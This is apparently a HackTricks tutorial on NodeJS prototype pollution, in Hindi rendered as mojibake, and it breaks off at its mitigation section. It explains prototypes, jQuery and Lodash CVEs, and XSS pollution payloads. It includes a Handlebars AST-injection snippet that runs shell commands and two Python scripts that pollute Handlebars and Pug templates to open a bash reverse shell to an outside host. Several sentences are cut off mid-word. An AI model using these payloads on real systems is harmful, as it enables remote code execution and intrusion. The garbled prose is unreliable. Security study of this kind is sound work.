# NodeJS - \_\_proto\_\_ & prototype рдкреНрд░рджреВрд╖рдг

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## JavaScript рдореЗрдВ рдСрдмреНрдЬ
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
рдПрдХ рдЦрд╛рд▓реА рдСрдмреНрдЬреЗрдХреНрдЯ рдПрдХ рдЦрд╛рд▓реА рд╢рдмреНрджрдХреЛрд╢ рдХреЗ рд╕рдорд╛рди рд╣реИ, рдЬрд┐рд╕реЗ `{}` рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдлрдВрдХреНрд╢рди рдФрд░ рдХреНрд▓рд╛рд╕реЗрд╕

рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ, рдХреНрд▓рд╛рд╕реЗрд╕ рдФрд░ рдлрдВрдХреНрд╢рди рдЧрд╣рд░реЗ рд░реВрдк рд╕реЗ рдЬреБрдбрд╝реЗ рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд╣рд╛рдВ рдлрдВрдХреНрд╢рди рдЕрдХреНрд╕рд░ рдХреНрд▓рд╛рд╕ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдорд╛рддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддреЗ рд╣реИрдВред рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдкреНрд░рд╛рдХреГрддрд┐рдХ рдХреНрд▓рд╛рд╕ рд╕рдорд░реНрдерди рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдирд┐рд░реНрдорд╛рддрд╛рдУрдВ рдХрд╛ рд╡рд░реНрдЧ рд╡реНрдпрд╡рд╣рд╛рд░ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### JavaScript рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк

JavaScript рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХреЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдЧреБрдгреЛрдВ рдХреЛ рд░рдирдЯрд╛рдЗрдо рдореЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд, рдЬреЛрдбрд╝рд╛ рдпрд╛ рд╣рдЯрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд▓рдЪреАрд▓рд╛рддрд╛ рд╡рд░реНрдЧ рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рдЧрддрд┐рд╢реАрд▓ рд╡рд┐рд╕реНрддрд╛рд░ рд╕рдВрднрд╡ рдмрдирд╛рддрд╛ рд╣реИред

`toString` рдФрд░ `valueOf` рдЬреИрд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ JavaScript рдХреЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рдгрд╛рд▓реА рдХреА рд▓рдЪреАрд▓рддрд╛ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред

## рд╡рд┐рд░рд╛рд╕рдд

рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдореЗрдВ, рдЧреБрдг/рд╡рд┐рдзрд┐рдпрд╛рдБ рд╡рд░реНрдЧреЛрдВ рд╕реЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реА рдЬрд╛рддреА рд╣реИрдВред рдпреЗ рд╡рд░реНрдЧ рдПрдХ рдЕрдиреНрдп рд╡рд░реНрдЧ рдХреЗ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдпрд╛ рдПрдХ рдЦрд╛рд▓реА рдСрдмреНрдЬ
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
рдСрдмреНрдЬреЗрдХреНрдЯ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рддрдХ рдкрд╣реБрдВрдЪ рд╕рдВрднрд╡ рд╣реИ:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
рдЬрдм Object prototype рдореЗрдВ properties рдЬреЛрдбрд╝ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рд╣рд░ JavaScript object рдЗрди рдирдП properties рдХреЛ рд╡рд╛рд░рд┐рд╕реНрдд рдХрд░реЗрдЧрд╛:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди

рдЬрд╣рд╛рдВ `__proto__` рдЙрдкрдпреЛрдЧ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рд▓рдЧрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдПрдХ рд╡рд┐рдХрд▓реНрдк рд╣реИ:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
рдпрд╣ рдХреЗрд╡рд▓ `Vehicle` рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рд╕реЗ рдмрдирд╛рдП рдЧрдП рдСрдмреНрдЬ
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. рдПрдХ рдмрд╣реБрдд рдЖрдо рдврдВрдЧ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕рдВрд░рдЪрдирд╛ рдХреЗ constructor рдХрд╛ prototype рдкреНрд░рджреВрд╖рдг рдХрд░рдирд╛:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
## рдЕрдиреНрдп рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдирд╛

### рдХреНрд▓рд╛рд╕ рд╕реЗ Object.prototype рддрдХ

рдПрдХ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЬрд╣рд╛рдБ рдЖрдк **рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЖрдкрдХреЛ **`Object.prototype` рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ** рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЗ рд╕рд╛рде рдЗрд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Array elements pollution

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬреИрд╕реЗ рдЖрдк JS рдореЗрдВ рдСрдмреНрдЬ
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html elements pollution

JS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ HTML element рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╕рдордп **`innerHTML`** рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░рдХреЗ рдЗрд╕реЗ **рд╡рд┐рд╡рд┐рдз HTML рдХреЛрдб** рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╡ рд╣реИред [рдЗрд╕ рд▓реЗрдЦ рд╕реЗ рд╡рд┐рдЪрд╛рд░ рдФрд░ рдЙрджрд╛рд╣рд░рдг](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)ред

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## рдЙрджрд╛рд╣рд░рдг

### рдореВрд▓ рдЙрджрд╛рд╣рд░рдг

рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдПрдХ рджреЛрд╖ рдХреЗ рдХрд╛рд░рдг рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ `Object.prototype` рдкрд░ рдЧреБрдгреЛрдВ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХреНрдпреЛрдВрдХрд┐ рдЕрдзрд┐рдХрд╛рдВрд╢ рдСрдмреНрдЬреЗрдХреНрдЯ `Object.prototype` рд╕реЗ рдЕрдкрдиреЗ рдЧреБрдг рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВред

рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рдЙрджрд╛рд╣рд░рдг рд╣реИ рдХрд┐рд╕реА рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ **рдЕрдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЧреБрдг** рдореЗрдВ рдПрдХ рдорд╛рди рдЬреЛрдбрд╝рдирд╛ рдЬреЛ рдЬрд╛рдВрдЪ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреИрд╕реЗ:
```javascript
if (user.admin) {
```
рдпрджрд┐ рдЧреБрдгрд╡рддреНрддрд╛ **`admin` рдЕрдирд┐рд░реНрдзрд╛рд░рд┐рдд** рд╣реИ рддреЛ рдПрдХ PP рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рд╕рддреНрдп рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
рдЗрд╕рдХреЗ рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдХрд╛ рдкреАрдЫрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЧреБрдгреЛрдВ рдХреЛ рдордирд┐рдкреБрд░реНрде рдХрд░рдирд╛ рддрд╛рдХрд┐ рдЕрдЧрд░ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдХреБрдЫ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЗрдирдкреБрдЯ рдХреЗ рдЙрдкрд░ рдХрдВрдЯреНрд░реЛрд▓ рд╣реЛ, рддреЛ рд╡реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╕рднреА рдСрдмреНрдЬ
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto рдкреНрд░рджреВрд╖рдг рд╕реЗ RCE рддрдХ

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╕реЗ XSS рддрдХ

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019тАУ11358: jQuery $ .extend рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╣рдорд▓рд╛

[рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ рд▓реЗрдЦ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
jQuery рдореЗрдВ, `$ .extend` рдлрд╝рдВрдХреНрд╢рди рдЧрд╣рд░реА рдХреЙрдкреА рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рдкрд░ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдЖрдо рддреМрд░ рдкрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреНрд▓реЛрдирд┐рдВрдЧ рдпрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ рдЧреБрдгреЛрдВ рдХреЛ рдорд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдП, рдирдП рдСрдмреНрдЬ
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
рдпрд╣ рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреА, рдЬрд┐рд╕реЗ CVE-2019тАУ11358 рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣рдЪрд╛рдирд╛ рдЧрдпрд╛ рд╣реИ, рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ рдПрдХ рдЧрд╣рд░реА рдХреЙрдкреА рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдкрдбрд╝ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ `isAdmin` рдЬреИрд╕реА рдЧреБрдгрд╡рддреНрддрд╛рдПрдБ рд╕рд╣реА рдореМрдЬреВрджрдЧреА рд╕рддреНрдпрд╛рдкрди рдХреЗ рдмрд┐рдирд╛ рдЬрд╛рдВрдЪреА рдЬрд╛рддреА рд╣реИрдВред


### CVE-2018тАУ3721, CVE-2019тАУ10744: рд▓реЛрдбрд╛рд╢ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рд╣рдорд▓рд╛

[рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ рд▓реЗрдЦ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) рдиреЗ рд╕рдорд╛рди рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреАрдЬрд╝ (CVE-2018тАУ3721, CVE-2019тАУ10744) рдХрд╛ рд╕рд╛рдордирд╛ рдХрд┐рдпрд╛ред рдЗрди рдореБрджреНрджреЛрдВ рдХреЛ рд╕рдВрд╕реНрдХрд░рдг 4.17.11 рдореЗрдВ рд╕рдВрдмреЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

### рдПрдХ рдФрд░ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рд╕реАрд╡реАрдИ рдХреЗ рд╕рд╛рде

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### рдиреЛрдбрдЬреЗрдПрд╕ рдореЗрдВ рдПрдПрд╕рдЯреА рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди

рдиреЛрдбрдЬреЗрдПрд╕ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдПрдмреНрд╕реНрдЯреНрд░реИрдХреНрдЯ рд╕рд┐рдВрдЯреИрдХреНрд╕ рдЯреНрд░реАрдЬрд╝ (AST) рдХрд╛ рд╡реНрдпрд╛рдкрдХ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрдиреНрд╕ рдФрд░ рдЯрд╛рдЗрдкрд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд▓рд┐рдПред рдпрд╣ рдЦрдВрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрдиреНрд╕, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рдФрд░ рдкрдЧ рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рднрдпрд╛рд╡рд╣рддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИред

#### рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рд╡рд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреА рд╡рд┐рд╢реНрд▓реЗрд╖рдг

рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдПрдХ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИред рдпрд╣ рд╡рд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреА `javascript-compiler.js` рдлрд╝рд╛рдЗрд▓ рдХреЗ рднреАрддрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрдпреЛрдВ рд╕реЗ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `appendContent` рдлрд╝рдВрдХреНрд╢рди, рдпрджрд┐ рдпрд╣ рдореМрдЬреВрдж рд╣реИ, рддреЛ `pendingContent` рдХреЛ рдЬреЛрдбрд╝рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ `pushSource` рдлрд╝рдВрдХреНрд╢рди рд╕реНрд░реЛрдд рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рдмрд╛рдж `pendingContent` рдХреЛ `undefined` рдкрд░ рд░реАрд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред

##### рд╢реЛрд╖рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛

рд╢реЛрд╖рдг рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдПрдПрд╕рдЯреА (рдПрдмреНрд╕реНрдЯреНрд░реИрдХреНрдЯ рд╕
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
рдпрд╣ рдХреЛрдб рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреИрд╕реЗ Handlebars рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рд╡рд┐рдЪрд┐рддреНрд░ рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

**рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрдн**: 'flat' рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХ рдореБрджреНрджрд╛ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЬрд┐рд╕рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░ рдпрд╣рд╛рдБ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ: [рдЧрд┐рдердм рдкрд░ рдореБрджреНрджрд╛](https://github.com/hughsk/flat/issues/105)ред

**рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрдн**: [Python рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рдЙрддреНрдкреАрдбрд╝рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛ рджреЛрд╖

Pug, рдПрдХ рдФрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди, рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рдХрд╛ рдПрдХ рд╕рдорд╛рди рдЬреЛрдЦрд┐рдо рдЙрдард╛рддрд╛ рд╣реИред рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА [AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug) рдкрд░ рдЪрд░реНрдЪрд╛ рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИред

Pug рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### рдирд┐рд╡рд╛рд░рдХ рдЙрдкрд╛рдп

рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХреЗ рдЬреЛрдЦрд┐рдо рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдиреАрдЪреЗ рджреА рдЧрдИ рд░рдгрдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

1. **рдСрдмреНрдЬ
